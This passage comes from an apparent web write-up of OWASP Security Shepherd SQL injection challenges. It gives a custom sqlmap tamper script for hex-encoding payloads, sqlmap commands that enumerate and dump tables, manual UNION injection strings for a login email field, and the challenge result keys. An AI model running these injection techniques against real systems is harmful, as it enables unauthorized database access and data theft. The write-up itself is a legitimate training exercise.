+<span class="hll"><span class="go">| 2      | 861267      | 100        | spcil&amp;#x2f;&amp;#x7c;Pse3cr3etCouponStu.f4rU176 |</span>
+</span><span class="go">+--------+-------------+------------+---------------------------------------------+</span>
+</pre></div>
+</div>
+<p>This gives the coupon ‘spcil&amp;#x2f;&amp;#x7c;Pse3cr3etCouponStu.f4rU176’ which unencoded is ‘spcil/|Pse3cr3etCouponStu.f4rU176’. If we change the $3000 troll to quantity 1 and enter the VIP coupon code, clicking <span class="guilabel">Place Order</span> gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Your order comes to a total of $0</span>
+</span>
+<span class="hll"><span class="go">Trolls were free, Well Done -</span>
+</span><span class="hll"><span class="go">343f2e424d5d7a2eff7f9ee5a5a72fd97d5a19ef7bff3ef2953e033ea32dd7ee</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="sql-injection-6">
+<h2>3.15.5.7. SQL Injection 6<a class="headerlink" href="#sql-injection-6" title="Permalink to this headline">¶</a></h2>
+<p>First of all the web page pin entry is capped at 4 characters, so either Tamper Data, <strong class="program">curl</strong>, or something similar is needed to try SQL injection. After trying numerous blind SQL queries you either resort to the cheat or realize that you have to \x-encode the input.</p>
+<p>To \x-encode the input for <strong class="program">sqlmap</strong> a python program <strong class="program">hexencode.py</strong> must be created. The following script creates a subdirectory <code class="file docutils literal"><span class="pre">tamper</span></code> with <strong class="program">hexencode.py</strong> and the required <code class="file docutils literal"><span class="pre">__init__.py</span></code>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">mkdir -p tamper
+</span><span class="hll"><span class="nb">cd</span> tamper
+</span>
+<span class="hll">cat &gt; __init__.py <span class="s">&lt;&lt;EOF</span>
+</span><span class="s">#!/usr/bin/env python</span>
+<span class="s">pass</span>
+<span class="s">EOF</span>
+
+<span class="hll">cat &gt; hexencode.py <span class="s">&lt;&lt;EOF</span>
+</span><span class="s">#!/usr/bin/env python</span>
+
+<span class="s">&quot;&quot;&quot;</span>
+<span class="s">Copyright (c) 2006-2015 sqlmap developers (http://sqlmap.org/)</span>
+<span class="s">See the file &#39;doc/COPYING&#39; for copying permission</span>
+<span class="s">&quot;&quot;&quot;</span>
+
+<span class="s">import os</span>
+<span class="s">import string</span>
+
+<span class="s">from lib.core.enums import PRIORITY</span>
+<span class="s">from lib.core.common import singleTimeWarnMessage</span>
+
+<span class="s">__priority__ = PRIORITY.LOWEST</span>
+
+<span class="s">def dependencies():</span>
+<span class="s">    pass</span>
+
+<span class="s">def tamper(payload, **kwargs):</span>
+<span class="s">    &quot;&quot;&quot;</span>
+<span class="s">    Modified charunicodeencode.py</span>
+
+<span class="s">    Requirement: none</span>
+
+<span class="s">    Tested against:</span>
+<span class="s">        * MySQL 5.5.43</span>
+
+<span class="s">    Notes:</span>
+<span class="s">        * Changes &#39;%&#39;-encoding to hex-encoding; encodes everything</span>
+<span class="s">        * Currently handles only ASCII</span>
+
+<span class="s">    &gt;&gt;&gt; tamper(&#39;SELECT FIELD%20FROM TABLE&#39;)</span>
+<span class="s">    &#39;\x53\x45\x4C\x45\x43\x54\x20\x46\x49\x45\x4C\x44\x20\x46\x52\x4F\x4D\x20\x54\x41\x42\x4C\x45&#39;</span>
+<span class="s">    &quot;&quot;&quot;</span>
+
+<span class="s">    retVal = payload</span>
+
+<span class="s">    if payload:</span>
+<span class="s">        retVal = &quot;&quot;</span>
+<span class="s">        i = 0</span>
+
+<span class="s">        while i &lt; len(payload):</span>
+<span class="s">            if payload[i] == &#39;%&#39; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits:</span>
+<span class="s">                retVal += &quot;\\\\x%s&quot; % payload[i + 1:i + 2]</span>
+<span class="s">                i += 3</span>
+<span class="s">            else:</span>
+<span class="s">                retVal += &quot;\\\\x%.2X&quot; % ord(payload[i])</span>
+<span class="s">                i += 1</span>
+
+<span class="s">    return retVal</span>
+<span class="s">EOF</span>
+<span class="hll"><span class="nb">cd</span> ..
+</span></pre></div>
+</div>
+<p>Now let’s try for a SQL injection with the help of <strong class="program">hexencode.py</strong>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, URL, and POSTDATA.</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;currentPerson=YUd1ZXN0; JSESSIONID=DC81FF84682F17ED9600659BCA00C3AF; token=159087069452397663042571439753374898368; JSESSIONID3=&quot;XHAMNIXS+EtfXshD4Kgjvw==&quot;&#39;</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2&#39;</span>
+<span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;pinNumber=*&#39;</span>
+
+rm -rf sqlmap
+sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+    --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
+    --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --dbms<span class="o">=</span>MySQL <span class="se">\</span>
+    --banner --current-user --current-db --is-dba <span class="se">\</span>
+    --users --passwords --dbs --exclude-sysdbs <span class="se">\</span>
+<span class="hll">    --tamper<span class="o">=</span><span class="nv">$PWD</span>/tamper/hexencode <span class="se">\</span>
+</span>    --url <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-text"><div class="highlight"><pre><span></span>sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
+    Payload: pinNumber=&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))mMlN) AND &#39;QusI&#39;=&#39;QusI
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: pinNumber=&#39; UNION ALL SELECT CONCAT(0x717a6a7171,0x4e4a79796f4a65506670,0x7170627671)--
+---
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: MySQL 5.0.12
+banner:    &#39;5.5.43-0ubuntu0.14.04.1&#39;
+current user:    &#39;userLookUuuup&amp;#x40;localhost&#39;
+current database:    &#39;SqlChalSix&#39;
+current user is DBA:    False
+database management system users [1]:
+[*] &amp;#x27;userLookUuuup&amp;#x27;&amp;#x40;&amp;#x27;localhost&amp;#x27;
+[10:35:07] [WARNING] unable to retrieve the number of password hashes for user &#39;&amp;#x27;userLookUuuup&amp;#x27;&amp;#x40;&amp;#x27;localhost&amp;#x27;&#39;
+[10:35:07] [ERROR] unable to retrieve the password hashes for the database users (probably because the session user has no read privileges over the relevant system database table)
+available databases [2]:
+[*] information_schema
+<span class="hll">[*] SqlChalSix
+</span>:emphasize-lines: 24
+</pre></div>
+</div>
+<p>Next determine tables in database SqlChalSix:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+    --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
+    --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --data<span class="o">=</span><span class="s2">&quot;pinNumber=*&quot;</span> <span class="se">\</span>
+    --dbms<span class="o">=</span>MySQL <span class="se">\</span>
+<span class="hll">    -D SqlChalSix --tables <span class="se">\</span>
+</span>    --tamper<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PWD</span><span class="s2">/tamper/hexencode&quot;</span> <span class="se">\</span>
+    --url <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalSix</span>
+<span class="go">[1 table]</span>
+<span class="go">+-------+</span>
+<span class="hll"><span class="go">| users |</span>
+</span><span class="go">+-------+</span>
+</pre></div>
+</div>
+<p>Next dump table users in database SqlChalSix:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+    --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
+    --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --data<span class="o">=</span><span class="s2">&quot;pinNumber=*&quot;</span> <span class="se">\</span>
+    --dbms<span class="o">=</span>MySQL <span class="se">\</span>
+<span class="hll">    -D SqlChalSix -T users --dump <span class="se">\</span>
+</span>    --tamper<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PWD</span><span class="s2">/tamper/hexencode&quot;</span> <span class="se">\</span>
+    --url <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalSix</span>
+<span class="go">Table: users</span>
+<span class="go">[7 entries]</span>
+<span class="go">+---------+---------+---------+----------+------------------------------------------------------------------+-----------------------------------------------+</span>
+<span class="go">| idusers | userPin | userAge | userName | userAnswer                                                       | userQuestion                                  |</span>
+<span class="go">+---------+---------+---------+----------+------------------------------------------------------------------+-----------------------------------------------+</span>
+<span class="go">| 1       | 8367    | 23      | George   | A Red Rose                                                       | What is your favourite Flower                 |</span>
+<span class="hll"><span class="go">| 2       | 4685    | 98      | Brendan  | 17f999a8b3fbfde54124d6e94b256a264652e5087b14622e1644c884f8a33f82 | What is the answer to this level&amp;#x3f;        |</span>
+</span><span class="go">| 3       | 1254    | 25      | Sean     | Thor                                                             | Your favourite Viking                         |</span>
+<span class="go">| 4       | 7844    | 84      | Anthony  | All of the games                                                 | What game do I suck at&amp;#x3f;                  |</span>
+<span class="go">| 5       | 4648    | 33      | Owen     | Peanutbutter                                                     | Favourite Sandwhich Topping                   |</span>
+<span class="go">| 6       | 2653    | 12      | Eoin     | The Dark Side of the Moon                                        | Where did I holiday in the summer of 69&amp;#x3f; |</span>
+<span class="go">| 7       | 3598    | 6       | David    | Don&amp;#x27;t get me started                                        | This is how we get ants                       |</span>
+<span class="go">+---------+---------+---------+----------+------------------------------------------------------------------+-----------------------------------------------+</span>
+</pre></div>
+</div>
+<p>We can see the challenge answer <strong>17f999a8b3fbfde54124d6e94b256a264652e5087b14622e1644c884f8a33f82</strong> in the table row for Brendan.</p>
+</div>
+<div class="section" id="sql-injection-7">
+<h2>3.15.5.8. SQL Injection 7<a class="headerlink" href="#sql-injection-7" title="Permalink to this headline">¶</a></h2>
+<p>Although the write up is short, the amount of time finding the solution was not insignificant. First, there are some restrictions on the length of the inputs that make using <strong class="program">sqlmap</strong> challenging. Although the email address is actually checked, that’s not too much of a restriction as something on the order of <code class="docutils literal"><span class="pre">&quot;bunch</span> <span class="pre">of</span> <span class="pre">junk&quot;&#64;x</span></code> passes for a legal email address. If the SQL injection is in the email address then we want a true out of the email address check with the password being ignored.</p>
+<p>Attempts using email of <code class="docutils literal"><span class="pre">&quot;'||1#&quot;&#64;x</span></code> with password <code class="docutils literal"><span class="pre">password</span></code> didn’t work. The email addressed was legal but the <code class="docutils literal"><span class="pre">#</span></code> didn’t comment out the rest of the SQL query. If it did, the <code class="docutils literal"><span class="pre">||1</span></code> should have returned a true value and presumably success.</p>
+<p>Another way to nullify the effect of the rest of the SQL query is to insert a UNION statement at the end of the email input. We’ll need a table for the UNION query and we guess there’s a users table. Trying email <code class="docutils literal"><span class="pre">&quot;'||1</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">1</span> <span class="pre">FROM</span> <span class="pre">users</span> <span class="pre">WHERE</span> <span class="pre">'1'='&quot;&#64;x</span></code> with password <code class="docutils literal"><span class="pre">password</span></code> works. Note that the first part of the UNION statement WHERE clause is false; the password field should be joined to it by an AND, making the UNION statement return nothing. So the overall query should return true for the first user.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Welcome User 1</span>
+</span>
+<span class="hll"><span class="go">The result key for this level is</span>
+</span><span class="hll"><span class="go">okhRdaJDUkykc88PGBgLG008zQt/LTKlkSad+cur6cHQ6DlkGPs4miMh3x0YeMyQynuR9ZoLrP4n4xToWx6HNM40A4pRvfR+VlYvE0LNDm/1B9ucoeJXtDt3UQr/RmUOen148gH25Qzykx66jwvmhw==</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="sql-injection-stored-procedure">
+<h2>3.15.5.9. SQL Injection Stored Procedure<a class="headerlink" href="#sql-injection-stored-procedure" title="Permalink to this headline">¶</a></h2>
+<p>For this SQL injection we’ll rely on <strong class="program">sqlmap</strong>.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, URL, and POSTDATA.</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;currentPerson=YUd1ZXN0; JSESSIONID=DC81FF84682F17ED9600659BCA00C3AF; token=159087069452397663042571439753374898368; JSESSIONID3=&quot;XHAMNIXS+EtfXshD4Kgjvw==&quot;&#39;</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/7edcbc1418f11347167dabb69fcb54137960405da2f7a90a0684f86c4d45a2e7&#39;</span>
+<span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;userIdentity=*&#39;</span>
+
+rm -rf sqlmap
+sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+    --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
+    --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --dbms<span class="o">=</span>MySQL <span class="se">\</span>
+    --banner --current-user --current-db --is-dba <span class="se">\</span>
+    --users --passwords --dbs --exclude-sysdbs <span class="se">\</span>
+    --url <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">sqlmap identified the following injection point(s) with a total of 1377 HTTP(s) requests:</span>
+<span class="go">---</span>
+<span class="go">Parameter: #1* ((custom) POST)</span>
+<span class="go">    Type: error-based</span>
+<span class="go">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</span>
+<span class="go">    Payload: userIdentity=&#39; AND (SELECT 3597 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3597=3597,1))),0x71627a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;uVKc&#39;=&#39;uVKc</span>
+
+<span class="go">    Type: AND/OR time-based blind</span>
+<span class="go">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</span>
+<span class="go">    Payload: userIdentity=&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))DoUo) AND &#39;UjqK&#39;=&#39;UjqK</span>
+<span class="go">---</span>
+<span class="go">back-end DBMS operating system: Linux Ubuntu</span>
+<span class="go">back-end DBMS: MySQL 5.0</span>
+<span class="go">banner:    &#39;5.5.43-0ubuntu0.14.04.1&#39;</span>
+<span class="go">current user:    &#39;procChalUser&amp;#x40;localhost&#39;</span>
+<span class="go">current database:    &#39;SqlChalStoredProc&#39;</span>
+<span class="go">current user is DBA:    False</span>
+<span class="go">database management system users [1]:</span>
+<span class="go">[*] &amp;#x27;procChalUser&amp;#x27;&amp;#x40;&amp;#x27;localhost&amp;#x27;</span>
+<span class="go">[11:30:13] [ERROR] unable to retrieve the password hashes for the database users (probably because the session user has no read privileges over the relevant system database table)</span>
+<span class="go">available databases [2]:</span>
+<span class="go">[*] information_schema</span>
+<span class="hll"><span class="go">[*] SqlChalStoredProc</span>
+</span></pre></div>
+</div>
+<p>Next determine tables in database SqlChalStoredProc:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+    --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
+    --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --dbms<span class="o">=</span>MySQL <span class="se">\</span>
+<span class="hll">    -D <span class="s1">&#39;SqlChalStoredProc&#39;</span> --tables <span class="se">\</span>
+</span>    --url <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalStoredProc</span>
+<span class="go">[1 table]</span>
+<span class="go">+-----------+</span>
+<span class="hll"><span class="go">| customers |</span>
+</span><span class="go">+-----------+</span>
+</pre></div>
+</div>
+<p>Next dump the table customers:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+    --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
+    --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --dbms<span class="o">=</span>MySQL <span class="se">\</span>
+<span class="hll">    -D <span class="s1">&#39;SqlChalStoredProc&#39;</span> -T customers --dump <span class="se">\</span>
+</span>    --url <span class="nv">$URL</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalStoredProc</span>
+<span class="go">Table: customers</span>
+<span class="go">[4 entries]</span>
+<span class="go">+------------------------------------------+----------------------------------------------------------------------------------------------------+--------------+----------------------------------------------+</span>
+<span class="go">| customerId                               | comment                                                                                            | customerName | customerAddress                              |</span>
+<span class="go">+------------------------------------------+----------------------------------------------------------------------------------------------------+--------------+----------------------------------------------+</span>
+<span class="go">| 019ce129ee8960a6b875b20095705d53f8c7b0ca | NULL                                                                                               | John Fits    | crazycat&amp;#x40;example.com                    |</span>
+<span class="go">| 05159435826869ccfd76d77a2ed4ba7c2023f0cb | NULL                                                                                               | Rubix Man    | manycolours&amp;#x40;cube.com                    |</span>
+<span class="hll"><span class="go">| 44e2bdc1059903f464e5ba9a34b927614d7fee55 | Well Done&amp;#x21; The Result key is d9c5757c1c086d02d491cbe46a941ecde5a65d523de36ac1bfed8dd4dd9994c8 | Rita Hanolan | the1night2before3four&amp;#x40;exampleEmails.com |</span>
+</span><span class="go">| 6c5c26a1deccf4a87059deb0a3fb463ff7d62fd5 | NULL                                                                                               | Paul O Brien | sixshooter&amp;#x40;deaf.com                     |</span>
+<span class="go">+------------------------------------------+----------------------------------------------------------------------------------------------------+--------------+----------------------------------------------+</span>
+</pre></div>
+</div>
+<p>The result key is in the row for “Rita Hanolan”.</p>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="security_shepherd_crypto_storage.html" class="btn btn-neutral float-right" title="3.15.6. Insecure Cryptographic Storage" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="security_shepherd_url_access.html" class="btn btn-neutral" title="3.15.4. Failure to Restrict URL Access" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
